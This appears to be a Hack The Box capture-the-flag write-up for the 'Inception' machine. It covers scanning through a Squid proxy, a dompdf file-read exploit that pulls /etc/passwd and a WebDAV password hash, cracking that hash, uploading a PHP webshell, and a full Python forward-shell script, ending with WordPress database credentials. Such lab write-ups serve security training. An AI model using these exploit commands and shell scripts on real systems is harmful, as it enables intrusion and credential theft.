---
title: "[HTB] Machine: Inception"
description: "[HTB] Machine: Inception"
date: 2023-10-17
menu:
  sidebar:
    name: "[HTB] Machine: Inception"
    identifier: htb-machine-Inception
    parent: htb-machines-linux
    weight: 10
hero: images/inception.png
tags: ["HTB", "dompdf", "squid", "proxychains", "wfuzz", "container", "lxd", "php-filter", "webdav", "davtest", "webshell", "forward-shell", "wordpress", "ping-sweep", "tftp", "apt", "apt-pre-invoke"]
---

# Inception
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.67
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 19:11 BST
Stats: 0:05:40 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 81.05% done; ETC: 19:18 (0:01:20 remaining)
Nmap scan report for 10.10.10.67 (10.10.10.67)
Host is up (0.10s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3128/tcp open  squid-http

Nmap done: 1 IP address (1 host up) scanned in 416.34 seconds
```
```
└─$ nmap -Pn -p80,3128 -sC -sV 10.10.10.67
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 19:19 BST
Nmap scan report for 10.10.10.67 (10.10.10.67)
Host is up (0.11s latency).

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.26 seconds

```

- Web server

![](./images/1.png)

- `feroxbuster`
```
└─$ feroxbuster -u http://10.10.10.67 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php --depth 2   

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.67
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      311c http://10.10.10.67/images => http://10.10.10.67/images/
200      GET        8l       71w     2380c http://10.10.10.67/assets/js/ie/html5shiv.js
200      GET      174l      401w     5284c http://10.10.10.67/assets/js/main.js
200      GET     1187l     2417w    22010c http://10.10.10.67/assets/css/main.css
200      GET       12l       34w      228c http://10.10.10.67/assets/css/ie9.css
200      GET       27l       54w      422c http://10.10.10.67/assets/css/ie8.css
200      GET     1051l      169w     2877c http://10.10.10.67/
200      GET      397l     4810w   190069c http://10.10.10.67/images/bg03.jpg
301      GET        9l       28w      311c http://10.10.10.67/assets => http://10.10.10.67/assets/
200      GET       69l      328w     2307c http://10.10.10.67/README.txt
200      GET       63l     2733w    17128c http://10.10.10.67/LICENSE.txt

```

## Foothold
- We saw a `squid` proxy
  - Let's configure `proxychains`
  - Add `http 10.10.10.67 3128` to `/etc/proxychains4.conf`
  - Now we can `nmap`

```
└─$ proxychains nmap -Pn -sC -sV 127.0.0.1 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-22 17:06 BST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 2.20% done; ETC: 17:11 (0:04:27 remaining)
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 2.60% done; ETC: 17:11 (0:04:22 remaining)
Stats: 0:03:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 67.70% done; ETC: 17:11 (0:01:41 remaining)
Nmap scan report for localhost (127.0.0.1)
Host is up (0.30s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 93:ad:d8:31:eb:db:c3:30:8e:96:c4:60:82:8b:4f:c4 (RSA)
|   256 1e:a8:07:32:25:c2:f9:a7:65:98:0e:52:15:3d:96:f7 (ECDSA)
|_  256 37:1d:45:db:f6:b1:2a:92:50:13:69:de:77:a4:ef:ae (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Inception
|_http-server-header: Apache/2.4.18 (Ubuntu)
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 374.76 seconds
```
```
└─$ proxychains ssh root@localhost
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
root@localhost's password:
```
- We could also use `wfuzz` to perform a scan using `squid` as proxy
```
└─$  wfuzz -u http://127.0.0.1:FUZZ -z range,1-65535 -p 10.10.10.67:3128:HTTP --hw 399
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://127.0.0.1:FUZZ/
Total requests: 65535

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000022:   200        2 L      4 W        60 Ch       "22"
000000080:   200        1051 L   169 W      2877 Ch     "80"
000003128:   400        151 L    416 W      3521 Ch     "3128" 
```

- We saw a comment on port `80` about `dompdf`

![](./images/2.png)

- If we visit `/dompdf`, we have a hit and the  `version` is `0.6.0`

![](./images/3.png)

- We have a [exploit](https://www.exploit-db.com/exploits/33004)
```
└─$ curl -s 'http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd'
%PDF-1.3
1 0 obj
<< /Type /Catalog
...
BT 34.016 734.579 Td /F1 12.0 Tf  [(cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMzpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDU6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzbG9nOng6MTA0OjEwODo6L2hvbWUvc3lzbG9nOi9iaW4vZmFsc2UKX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKc3NoZDp4OjEwNjo2NTUzNDo6L3Zhci9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpjb2JiOng6MTAwMDoxMDAwOjovaG9tZS9jb2JiOi9iaW4vYmFzaAo=)] TJ ET
endstream
...
```
```
└─$ echo "cm9vd..." | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash
```

- Let's enumerate
  - Can't read anything in `cobb`'s home directory
  - We can check `apache`'s config file for additional `vhosts`
  - Also `squid.conf`
    - `/etc/squid/squid.conf`
    - But nothing there
```
└─$ curl -s 'http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf'
...
PFZpcnR1YWxIb3N0ICo6ODA+CgkjIFRoZSBTZXJ2ZXJOYW1lIGRpcmVjdGl2ZSBzZXRzIHRoZSByZXF1ZXN0IHNjaGVtZSwgaG9zdG5hbWUgYW5kIHBvcnQgdGhhdAoJIyB0aGUgc2VydmVyIHVzZXMgdG8gaWRlbnRpZnkgaXRzZWxmLiBUaGlzIGlzIHVzZWQgd2hlbiBjcmVhdGluZwoJIyByZWRpcmVjdGlvbiBVUkxzLiBJbiB0aGUgY29udGV4dCBvZiB2aXJ0dWFsIGhvc3RzLCB0aGUgU2VydmVyTmFtZQoJIyBzcGVjaWZpZXMgd2hhdCBob3N0bmFtZSBtdXN0IGFwcGVhciBpbiB0aGUgcmVxdWVzdCdzIEhvc3Q6IGhlYWRlciB0bwoJIyBtYXRjaCB0aGlzIHZpcnR1YWwgaG9zdC4gRm9yIHRoZSBkZWZhdWx0IHZpcnR1YWwgaG9zdCAodGhpcyBmaWxlKSB0aGlzCgkjIHZhbHVlIGlzIG5vdCBkZWNpc2l2ZSBhcyBpdCBpcyB1c2VkIGFzIGEgbGFzdCByZXNvcnQgaG9zdCByZWdhcmRsZXNzLgoJIyBIb3dldmVyLCB5b3UgbXVzdCBzZXQgaXQgZm9yIGFueSBmdXJ0aGVyIHZpcnR1YWwgaG9zdCBleHBsaWNpdGx5LgoJI1NlcnZlck5hbWUgd3d3LmV4YW1wbGUuY29tCgoJU2VydmVyQWRtaW4gd2VibWFzdGVyQGxvY2FsaG9zdAoJRG9jdW1lbnRSb290IC92YXIvd3d3L2h0bWwKCgkjIEF2YWlsYWJsZSBsb2dsZXZlbHM6IHRyYWNlOCwgLi4uLCB0cmFjZTEsIGRlYnVnLCBpbmZvLCBub3RpY2UsIHdhcm4sCgkjIGVycm9yLCBjcml0LCBhbGVydCwgZW1lcmcuCgkjIEl0IGlzIGFsc28gcG9zc2libGUgdG8gY29uZmlndXJlIHRoZSBsb2dsZXZlbCBmb3IgcGFydGljdWxhcgoJIyBtb2R1bGVzLCBlLmcuCgkjTG9nTGV2ZWwgaW5mbyBzc2w6d2FybgoKCUVycm9yTG9nICR7QVBBQ0hFX0xPR19ESVJ9L2Vycm9yLmxvZwoJQ3VzdG9tTG9nICR7QVBBQ0hFX0xPR19ESVJ9L2FjY2Vzcy5sb2cgY29tYmluZWQKCgkjIEZvciBtb3N0IGNvbmZpZ3VyYXRpb24gZmlsZXMgZnJvbSBjb25mLWF2YWlsYWJsZS8sIHdoaWNoIGFyZQoJIyBlbmFibGVkIG9yIGRpc2FibGVkIGF0IGEgZ2xvYmFsIGxldmVsLCBpdCBpcyBwb3NzaWJsZSB0bwoJIyBpbmNsdWRlIGEgbGluZSBmb3Igb25seSBvbmUgcGFydGljdWxhciB2aXJ0dWFsIGhvc3QuIEZvciBleGFtcGxlIHRoZQoJIyBmb2xsb3dpbmcgbGluZSBlbmFibGVzIHRoZSBDR0kgY29uZmlndXJhdGlvbiBmb3IgdGhpcyBob3N0IG9ubHkKCSMgYWZ0ZXIgaXQgaGFzIGJlZW4gZ2xvYmFsbHkgZGlzYWJsZWQgd2l0aCAiYTJkaXNjb25mIi4KCSNJbmNsdWRlIGNvbmYtYXZhaWxhYmxlL3NlcnZlLWNnaS1iaW4uY29uZgoJQWxpYXMgL3dlYmRhdl90ZXN0X2luY2VwdGlvbiAvdmFyL3d3dy9odG1sL3dlYmRhdl90ZXN0X2luY2VwdGlvbgoJPExvY2F0aW9uIC93ZWJkYXZfdGVzdF9pbmNlcHRpb24+CgkJT3B0aW9ucyBGb2xsb3dTeW1MaW5rcwoJCURBViBPbgoJCUF1dGhUeXBlIEJhc2ljCgkJQXV0aE5hbWUgIndlYmRhdiB0ZXN0IGNyZWRlbnRpYWwiCgkJQXV0aFVzZXJGaWxlIC92YXIvd3d3L2h0bWwvd2ViZGF2X3Rlc3RfaW5jZXB0aW9uL3dlYmRhdi5wYXNzd2QKCQlSZXF1aXJlIHZhbGlkLXVzZXIKCTwvTG9jYXRpb24+CjwvVmlydHVhbEhvc3Q+CgojIHZpbTogc3ludGF4PWFwYWNoZSB0cz00IHN3PTQgc3RzPTQgc3Igbm9ldAo=
...
```
```
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
        Alias /webdav_test_inception /var/www/html/webdav_test_inception
        <Location /webdav_test_inception>
                Options FollowSymLinks
                DAV On
                AuthType Basic
                AuthName "webdav test credential"
                AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
                Require valid-user
        </Location>
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

- Let's retrieve `/var/www/html/webdav_test_inception/webdav.passwd`
```
└─$ curl -s 'http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd'
```
```
└─$ echo "d2ViZGF2X3Rlc3RlcjokYXByMSQ4ck83U21pNCR5cW43SC5HdkpGdHNUb3UxYTdWTUUwCg==" | base64 -d
webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
```

- Crack it
```
└─$ hashcat --user hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...
$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0:babygurl69          
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
Time.Started.....: Sun Oct 22 17:21:01 2023 (4 secs)
Time.Estimated...: Sun Oct 22 17:21:05 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     6883 H/s (9.01ms) @ Accel:32 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 22464/14344385 (0.16%)
Rejected.........: 0/22464 (0.00%)
Restore.Point....: 22400/14344385 (0.16%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidate.Engine.: Device Generator
Candidates.#1....: boneka -> 171091
Hardware.Mon.#1..: Util: 99%

Started: Sun Oct 22 17:20:47 2023
Stopped: Sun Oct 22 17:21:06 2023
```

- We have [WebDav](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav)
  - We could try `davtest`
```
└─$ davtest -url http://10.10.10.67/webdav_test_inception -auth webdav_tester:babygurl69    
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.67/webdav_test_inception
********************************************************
NOTE    Random string for this session: KYt_YHBtL4
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4
********************************************************
 Sending test files
PUT     txt     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.txt
PUT     cfm     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.cfm
PUT     asp     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.asp
PUT     jsp     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.jsp
PUT     php     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.php
PUT     cgi     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.cgi
PUT     aspx    SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.aspx
PUT     jhtml   SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.jhtml
PUT     shtml   SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.shtml
PUT     pl      SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.pl
PUT     html    SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.html
********************************************************
 Checking for test file execution
EXEC    txt     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.txt
EXEC    txt     FAIL
EXEC    cfm     FAIL
EXEC    asp     FAIL
EXEC    jsp     FAIL
EXEC    php     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.php
EXEC    php     FAIL
EXEC    cgi     FAIL
EXEC    aspx    FAIL
EXEC    jhtml   FAIL
EXEC    shtml   FAIL
EXEC    pl      FAIL
EXEC    html    SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.html
EXEC    html    FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.txt
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.cfm
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.asp
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.jsp
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.php
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.cgi
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.aspx
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.jhtml
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.shtml
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.pl
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.html
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.txt
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.php
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.html
```

- Let's create a webshell
```
└─$ curl -X PUT http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php -d @shell.php 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav_test_inception/shell.php has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.67 Port 80</address>
</body></html>
                            
```

- Test it
```
└─$ curl --data-urlencode 'cmd=id' http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php    
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- But if try to ping, I have nothing
```
└─$ curl --data-urlencode 'cmd=ping -c 1 10.10.16.9' http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php 
PING 10.10.16.9 (10.10.16.9) 56(84) bytes of data.

--- 10.10.16.9 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms

```

- It could be firewall
  - We could create a `forward shell` based on this [video](https://www.youtube.com/watch?v=-ST2FSbqEcU)
  - This is the basic template
```
import requests
import random

class forward_shell(object):
    def __init__(self, url, auth):
        self.url = url
        self.id = random.randrange(10000,99999)
        self.input = f"/dev/shm/stdin.{self.id}"
        self.output = f"/dev/shm/stdout.{self.id}"
        self.auth = auth
        print(f"[+] Starting forward shell with ID:{self.id}...")

        # Create pipe
        self.execute_raw(f"mkfifo {self.input}")
        self.execute_raw(f"tail -f {self.input} | /bin/sh 2>&1 > {self.output}", timeout=0.5)
        print(f"[+] Forward shell with ID:{self.id} has beed initialized...")
        
        
    def execute_raw(self, cmd, timeout=0.5):
        try:
            resp = requests.post(self.url, data={"cmd": cmd}, auth=self.auth, timeout=timeout)
        except requests.exceptions.ReadTimeout:
            return None
        return resp.text	
    
    def execute(self, cmd):
        self.execute_raw(f"echo {cmd} > {self.input}")
        resp = self.execute_raw(f"cat {self.output}; echo -n > {self.output}")
        return resp
		
    def upgrade_shell(self):
        shell_upgrade = """python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null"""
        stty = "stty raw -echo"
        print(self.execute(shell_upgrade))
        print(self.execute(stty))
		
if __name__ == "__main__":
    url = "http://10.10.10.67/webdav_test_inception/shell.php"
    auth = ("webdav_tester", "babygurl69")


    prompt = "$>"
    shell = forward_shell(url, auth)
    while True:
        cmd = input(prompt)
        if cmd == "upgrade":
            prompt = ""
            shell.upgrade_shell()
        else:
            print(shell.execute(cmd))

```

- Our shell works
```
└─$ python3 forward_shell.py                                                                                                            
[+] Starting forward shell with ID:97412...
[+] Forward shell with ID:97412 has beed initialized...
$>ls
shell.php
webdav.passwd

$>
```


## User
- During enumeration we see that we are probably inside container, since `ip` is different
```
$>ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:28:53:63 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.168.0.10/24 brd 192.168.0.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe28:5363/64 scope link 
       valid_lft forever preferred_lft forever

```

- Inside `/var/www/html` we see `wordpress`
  - Let's check the content
```
$>ls -lha /var/www/html
total 7.9M
drwxr-xr-x 7 root     root     4.0K Aug 10  2022 .
drwxr-xr-x 3 root     root     4.0K Aug 10  2022 ..
-rw-r--r-- 1 root     root      17K May  7  2017 LICENSE.txt
-rw-r--r-- 1 root     root     2.3K May  7  2017 README.txt
drwxr-xr-x 6 root     root     4.0K Aug 10  2022 assets
drwxrwxr-x 4 root     root     4.0K Aug 10  2022 dompdf
drwxr-xr-x 2 root     root     4.0K Aug 10  2022 images
-rw-r--r-- 1 root     root     2.9K Nov  6  2017 index.html
-rw-r--r-- 1 root     root     7.9M Oct 31  2017 latest.tar.gz
drwxr-xr-x 2 www-data www-data 4.0K Oct 23 16:42 webdav_test_inception
drwxr-xr-x 5 root     root     4.0K Aug 10  2022 wordpress_4.8.3

```

- We have creds inside `wp-config.php`
```
$>cat /var/www/html/wordpress_4.8.3/wp-config.php
...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
...
```

- We see port `22` is open
```
$>netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
